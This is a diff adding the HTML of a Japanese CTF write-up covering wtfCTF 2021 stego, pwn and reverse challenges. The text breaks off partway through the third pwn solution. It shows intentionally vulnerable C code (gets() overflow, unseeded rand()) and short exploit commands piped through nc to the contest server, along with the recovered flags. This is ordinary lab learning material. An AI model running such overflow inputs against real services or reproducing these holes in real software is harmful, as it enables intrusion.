@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>wtfCTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="URL: https://wtfctf.wearemist.in/challenges 856点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にな" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/wtfctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.78f8f17bab244b9ee62ad16480c9584d5fc2db06ae20681d1ca225cefd80767c.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="wtfCTF 2021 Writeup" />
+<meta property="og:description" content="URL: https://wtfctf.wearemist.in/challenges 856点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にな" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/wtfctf_2021/" />
+<meta property="article:published_time" content="2021-06-06T21:00:00+09:00" />
+<meta property="article:modified_time" content="2021-06-06T21:00:00+09:00" />
+<meta itemprop="name" content="wtfCTF 2021 Writeup">
+<meta itemprop="description" content="URL: https://wtfctf.wearemist.in/challenges 856点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にな">
+<meta itemprop="datePublished" content="2021-06-06T21:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-06-06T21:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="2366">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="wtfCTF 2021 Writeup"/>
+<meta name="twitter:description" content="URL: https://wtfctf.wearemist.in/challenges 856点を獲得し、最終順位は63位でした。 以下はチャレンジのリストです。 Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にな"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">wtfCTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-06 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc-m15tery_box-100-points">[Misc]: m15tery_Box (100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-mom5m4g1c-100-points">[Pwn]: MoM5m4g1c (100 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-k3y-150-points">[Pwn]: k3Y (150 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-pr1ns0n_br34k-500-pointsくらい">[Pwn]: Pr1ns0n_Br34k (500 pointsくらい)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev-h3ll0r3v-100-points">[Rev]: H3ll0R3v (100 points)</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fwtfctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://wtfctf.wearemist.in/challenges">https://wtfctf.wearemist.in/challenges</a>
+<br /><br /></p>
+<p>856点を獲得し、最終順位は63位でした。<br />
+<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_score.png" alt="wtfctf_2021_score.png"></p>
+<br>
+<p>以下はチャレンジのリストです。<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_solves1.png" alt="wtfctf_2021_solves1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/wtfctf_2021_solves2.png" alt="wtfctf_2021_solves2.png">
+<p><br><br></p>
+<p>Misc の m15tery_Box も解けたんですが、何回フラグをSubmitしても色が緑にならないなぁと思っていたら、いつの間にかイベントが終了してました。。。</p>
+<p>CTFTimeに記載されている開催期間はあてにしてはいけないことを学びました。</p>
+<p><br /><br /></p>
+<h2 id="misc-m15tery_box-100-points">[Misc]: m15tery_Box (100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>I keep losing my “keys”. Can you help me find it?</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>LSBmy5t3ry80x.png</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>PNG画像を foremost にかけると zipファイルが出てきます。</p>
+<p><br /></p>
+<p>zipファイルの中身は以下の通りです。</p>
+<pre>
+$ zipinfo 00000004.zip
+Archive:  00000004.zip
+Zip file size: 8459 bytes, number of entries: 33
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:31 My5t3rY/.not here/
+-rw-r--r--  6.3 unx       99 Bx u099 21-May-16 17:48 My5t3rY/.not here/flag.txt
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 17:09 My5t3rY/here/
+-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/.DS_Store
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:35 My5t3rY/here/.nope/
+-rw-r--r--  6.3 unx       61 Bx u099 21-May-14 14:35 My5t3rY/here/.nope/part1?.txt
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-14 14:49 My5t3rY/here/nope/
+-rw-r--r--  6.3 unx       88 Bx u099 21-May-14 14:49 My5t3rY/here/nope/.nope.txt
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:06 My5t3rY/here/not here/
+-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/not here/.DS_Store
+-rw-r--r--  6.3 unx      104 Bx u099 21-May-14 14:51 My5t3rY/here/not here/.confirmation.txt
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 03:33 My5t3rY/here/not here/no/
+-rw-r--r--  6.3 unx       83 Bx u099 21-May-19 04:35 My5t3rY/here/not here/no/maybe
+-rw-r--r--  6.3 unx       65 Bx u099 21-May-19 03:37 My5t3rY/here/not here/no/maybe not
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 04:30 My5t3rY/here/not here/yes/
+-rw-r--r--  6.3 unx     6148 Bx u099 21-May-19 04:30 My5t3rY/here/not here/yes/.DS_Store
+-rw-r--r--  6.3 unx       59 Bx u099 21-May-19 04:32 My5t3rY/here/not here/yes/roll
+-rw-r--r--  6.3 unx       34 Bx u099 21-May-16 17:47 My5t3rY/hint
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:16 My5t3rY/or here/.Noob/
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:18 My5t3rY/or here/.Noob/Are you/
+-rw-r--r--  6.3 unx      478 Bx u099 21-May-19 04:11 My5t3rY/or here/.Noob/Are you/.still a noob
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:17 My5t3rY/or here/.Noob/a noob?/
+-rw-r--r--  6.3 unx       78 Bx u099 21-May-19 04:20 My5t3rY/or here/.Noob/a noob?/hehe noob
+-rw-r--r--  6.3 unx       47 Bx u099 21-May-19 03:58 My5t3rY/or here/.something
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/Don't ask me/
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:14 My5t3rY/or here/Don't ask me/OKAY/
+-rw-r--r--  6.3 unx      241 Bx u099 21-May-19 04:04 My5t3rY/or here/Don't ask me/OKAY/if you insist
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-19 16:13 My5t3rY/or here/don't know/
+-rw-r--r--  6.3 unx      627 Bx u099 21-May-19 03:57 My5t3rY/or here/don't know/.chain.zip
+drwxr-xr-x  6.3 unx        0 bx stor 21-May-16 20:05 My5t3rY/or here/don't know/Not telling/
+-rw-r--r--  6.3 unx       66 Bx u099 21-May-19 03:41 My5t3rY/or here/don't know/Not telling/not again
+</pre>
+<p>unzipで解凍したところ、暗号化されたファイルが出てこなかったので、WindowsのExplzhで解凍することにしました。</p>
+<p>暗号化されたファイルのパスワードは、zstegで取れる以下でした。</p>
+<pre>
+b1,rgb,lsb,xy       .. text: "Pr1v4cY15@MytH"
+</pre>
+<p><br /></p>
+<p>フラグは3箇所に分かれているそうです。</p>
+<p>関係ないDecoyもいくつかありました。 (rot13とか、bacon-cipherとか、nak-nak-duckspeakとか、XORとか)</p>
+<p><br />
+[Part1]</p>
+<p>Filename: &lsquo;meow&rsquo; (以下が中身)</p>
+<pre>
+Kmmmmm. Czmz tjp cvqz ocz admno Kvmo
+
+
+roaXOA{di
+</pre>
+<p>quipquipで解けます。一番近いのを選んで、間違っている箇所は手動で修正。</p>
+<pre>
+-2.846	Prrrrr. Here byu have the first Part wtfOTF{in
+</pre>
+<p><code>wtfCTF{in</code></p>
+<p><br /><br /></p>
+<p>[Part2]</p>
+<p>Filename: &lsquo;maybe&rsquo; (以下が中身)</p>
+<pre>
+[part 2] XD
+
+
+
+X1RocjMzXw==
+
+
+
+this is the flag, but it isn't. Keep this in mind. 
+</pre>
+<p>Base64デコードで解けます。</p>
+<p><code>_Thr33_</code></p>
+<p><br /><br /></p>
+<p>[Part3]</p>
+<p>Filename: &lsquo;hehe noob&rsquo; (以下が中身)</p>
+<pre>
+VGhpcyBpcyB0aGUgbGFzdCBiaXQuCgoKW1BhcnQzXQoKCnBBciFzfQo=
+</pre>
+<p>Base64デコードで解けます。</p>
+<pre>
+This is the last bit.\n\n\n[Part3]\n\n\npAr!s}
+</pre>
+<p><code>pAr!s}</code></p>
+<p><br /></p>
+<p>Flag: <code>wtfCTF{in_Thr33_pAr!s}</code></p>
+<p><br /><br /></p>
+<h2 id="pwn-mom5m4g1c-100-points">[Pwn]: MoM5m4g1c (100 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Son:I want my chocolate mom! Mother: Fill the water bottle son! :)
+<br /><br />
+nc 20.42.99.115 3000</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>MoM5m4g1C.c</li>
+</ul>
+<p>以下が中身です。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">water</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">bottle</span><span class="p">[</span><span class="mi">125</span><span class="p">];</span>
+
+  <span class="n">water</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Fill the water bottle kid!&#34;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">bottle</span><span class="p">);</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="n">water</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat gift.txt&#34;</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">&#34;You are crazy lazy!:)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>提供されたのがC言語のソースコードのみで、バイナリはありません。</p>
+<p>ソースを見ると、BOFを起こしてローカル変数waterを0以外の値で上書きするだけのようです。</p>
+<p>テキトーにBOFを起こしました。</p>
+<pre>
+$ (python -c 'print("A"*150)' ; cat - ) | nc 20.42.99.115 3000
+
+wtfCTF{N1c3!n0w_U_c4N_34t_uR_Ch0c0L4t3}Fill the water bottle kid!
+</pre>
+<p><br /></p>
+<p>Flag: <code>wtfCTF{N1c3!n0w_U_c4N_34t_uR_Ch0c0L4t3}</code></p>
+<p><br /><br /></p>
+<h2 id="pwn-k3y-150-points">[Pwn]: k3Y (150 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Do you have the key to escape from this room?
+<br /><br />
+nc 20.42.99.115 3143</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>k3Y (ELF 64bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>まず、Ghidraでコードを確認します。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="hl"><span class="lnt"> 7
+</span></span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="hl"><span class="lnt">11
+</span></span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_c</span><span class="p">;</span>
+  
+<span class="hl">  <span class="n">local_c</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+</span>  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the Key: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102018</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">);</span>
+<span class="hl">  <span class="k">if</span> <span class="p">((</span><span class="n">local_10</span> <span class="o">^</span> <span class="n">local_c</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xacedface</span><span class="p">)</span> <span class="p">{</span>
+</span>    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Yayy! U made it!&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">&#34;cat flag&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Oops!, Best of luck with trying the other 2^32 cases.&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+rand()にSEEDを食わせていないので、毎回同じ値になりそうです。</p>
+<p>gdbで見た所、rand()の戻り地は以下の値になってました。</p>
+<pre>
+$rax   : 0x6b8b4567
+</pre>
+<p><br />
+入力すべき値 (local_10に入る値) はXORで求められます。</p>
+<pre>
+$ python3
+>>> 0x6b8b4567^0xacedface
+3345399721
+</pre>
+<p><br /></p>
+<p>実行結果：</p>
+<pre>
+$ nc 20.42.99.115 3143
+3345399721
+wtfCTF{c0n80!_Th15_i5_tH3_fL48}
+Enter the Key: Yayy! U made it!
+</pre>
+<p><br /></p>
+<p>Flag: <code>wtfCTF{c0n80!_Th15_i5_tH3_fL48}</code></p>
+<p><br /><br /></p>
+<h2 id="pwn-pr1ns0n_br34k-500-pointsくらい">[Pwn]: Pr1ns0n_Br34k (500 pointsくらい)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Really? Do u really want to break the prison you built on your own? You are insane!
+<br /><br />
+nc 20.42.99.115 3213</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>prison (ELF 64bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>まず、Ghidraでコードを確認します。</p>
+<p>main()から、build_prison()を呼んでいます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="hl"><span class="lnt">17
+</span></span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">bool</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">52</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_24</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="n">__gid_t</span> <span class="n">local_c</span><span class="p">;</span>
+  
+  <span class="n">local_c</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+  <span class="n">setresgid</span><span class="p">(</span><span class="n">local_c</span><span class="p">,</span><span class="n">local_c</span><span class="p">,</span><span class="n">local_c</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="hl">  <span class="n">build_prison</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
+</span>  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">local_24</span> <span class="o">*</span> <span class="n">local_20</span> <span class="o">*</span> <span class="n">local_1c</span><span class="p">;</span>
+  <span class="n">local_18</span> <span class="o">=</span> <span class="n">local_18</span> <span class="o">*</span> <span class="n">local_1c</span> <span class="o">*</span> <span class="n">local_14</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Prisoners escaped from your prison&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Oh god! Your prison is a mini-hell for the prisoners.&#34;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">local_18</span> <span class="o">&lt;</span> <span class="n">iVar1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>build_prison()の中でもローカル変数が定義されており、ここでBOFが起こせます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="hl"><span class="lnt"> 4
+</span></span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="hl"><span class="lnt">31
+</span></span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">undefined8</span> <span class="o">*</span> <span class="nf">build_prison</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="hl">  <span class="kt">char</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span>  <span class="n">undefined8</span> <span class="n">local_68</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_60</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_58</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_50</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_48</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_40</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
+  
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the number of prisoners per cell in your prison: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402050</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_38</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the number of cells per each block in your prison: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402050</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the number of blocks in your prison: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402050</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_30</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the number of gates per block in your prison: &#34;</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00402050</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_28</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter the number of cops for each gate in your prison: &#34;</span><span class="p">);</span>
